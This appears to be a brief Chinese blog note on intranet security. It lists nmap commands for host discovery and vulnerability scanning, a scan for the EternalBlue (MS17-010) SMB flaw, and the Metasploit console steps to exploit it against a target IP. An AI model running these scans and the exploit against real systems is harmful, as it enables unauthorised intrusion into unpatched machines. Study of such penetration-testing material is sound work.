[Note]内网安全
date: '2020-03-23T07:37:00.001+01:00'

---
内网IP存活：nmap -sP 192.168.1.1-225

                       nmap -sP 192.168.1.1/24

                       nmap -sn 192.168.1.1-225

                       nmap -sn 192.168.1.1/24

  
单IP扫描漏洞: nmap --script=vuln "ip"

  


扫描永恒之蓝: nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.102/24

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhh4_PYnCRJJbn0qKAcUYxEM-EL5jq7eAM8IBzqD4q-45e_fclLXPD-SZUPwGbKiO4O7aA5Z94bjrhdxH2gYNL-fpe7YIZTCvSApv_NOgYj5nYEuXBThYiznrQigCqYyjD0ppxBKeXx5mr4XSLyKNMi10Q_EgLM9kDWSi5x6xscCVPpak5rzWG0vV1y/s320/Screenshot%202022-03-23%20at%202.44.23%20PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhh4_PYnCRJJbn0qKAcUYxEM-EL5jq7eAM8IBzqD4q-45e_fclLXPD-SZUPwGbKiO4O7aA5Z94bjrhdxH2gYNL-fpe7YIZTCvSApv_NOgYj5nYEuXBThYiznrQigCqYyjD0ppxBKeXx5mr4XSLyKNMi10Q_EgLM9kDWSi5x6xscCVPpak5rzWG0vV1y/s1124/Screenshot%202022-03-23%20at%202.44.23%20PM.png)  
  
利用ms17-010: msfconsole

msf5> search ms17-010

msf5> use 3

msf5> show options

msf5> set rhost="ip"

msf5> exploit


